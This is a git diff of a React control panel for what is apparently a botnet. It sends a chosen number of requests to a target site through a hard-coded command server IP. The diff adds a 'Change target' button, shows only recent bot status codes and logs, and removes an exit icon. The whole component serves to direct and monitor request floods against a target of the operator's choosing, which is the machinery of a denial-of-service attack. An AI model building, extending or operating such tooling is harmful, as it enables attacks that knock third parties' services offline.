@@ -28,18 +28,6 @@ const Panel = () => {
 
   const serverUrl = "http://54.211.202.150:5000";
 
-  const exitIcon = (
-    <svg
-      width="24"
-      height="24"
-      xmlns="http://www.w3.org/2000/svg"
-      fill-rule="evenodd"
-      clip-rule="evenodd"
-    >
-      <path d="M11 21h8.033v-2l1-1v4h-9.033v2l-10-3v-18l10-3v2h9.033v5l-1-1v-3h-8.033v18zm-1 1.656v-21.312l-8 2.4v16.512l8 2.4zm11.086-10.656l-3.293-3.293.707-.707 4.5 4.5-4.5 4.5-.707-.707 3.293-3.293h-9.053v-1h9.053z" />
-    </svg>
-  );
-
   const [time, setTime] = useState(0);
   const [requestsNum, setRequestsNum] = useState(100);
   const [active, setActive] = useState(false);
@@ -137,9 +125,14 @@ const Panel = () => {
       setBotsStats(responseData.stats);
       console.log(responseData.stats);
       const statusCodes: number[] = [];
-      responseData.stats.forEach((resp: any) =>
-        statusCodes.push(...resp.Status)
-      );
+      responseData.stats.forEach((resp: any) => {
+        if (
+          new Date().getTime() - new Date(resp.ResponseTime).getTime() <
+          100000
+        ) {
+          statusCodes.push(...resp.Status);
+        }
+      });
       setResponses(statusCodes);
       setGraphData(parseStatsData(statusCodes));
     } catch (err) {
@@ -270,7 +263,14 @@ const Panel = () => {
                   />
                 </FormControl>
               </div>
-              <div className="w-5/6 flex justify-end">
+              <div className="w-5/6 flex gap-2 justify-end">
+                <Button
+                  onClick={() => {
+                    changeTarget(serverUrl, "https://" + target);
+                  }}
+                >
+                  Change target
+                </Button>
                 <Button
                   onClick={() => {
                     startBotnet(serverUrl, requestsNum, target);
@@ -286,13 +286,21 @@ const Panel = () => {
               <p className="text-gray-500 text-base mb-3">Bots response log:</p>
 
               {botsStats.length != 0
-                ? botsStats.map((response: any) => (
-                    <Code className="flex flex-col justify-start items-start">
-                      <p>TIME: {response.ResponseTime}</p>
-                      <p>TARGET: {response.Target}</p>
-                      <p>STATUS: {JSON.stringify(response.Status)}</p>
-                    </Code>
-                  ))
+                ? botsStats.reverse().map((response: any) => {
+                    if (
+                      new Date().getTime() -
+                        new Date(response.ResponseTime).getTime() <
+                      100000
+                    ) {
+                      return (
+                        <Code className="flex flex-col justify-start items-start">
+                          <p>TIME: {response.ResponseTime}</p>
+                          <p>TARGET: {response.Target}</p>
+                          <p>STATUS: {JSON.stringify(response.Status)}</p>
+                        </Code>
+                      );
+                    }
+                  })
                 : "No information retrieved yet"}
             </div>
           </div>
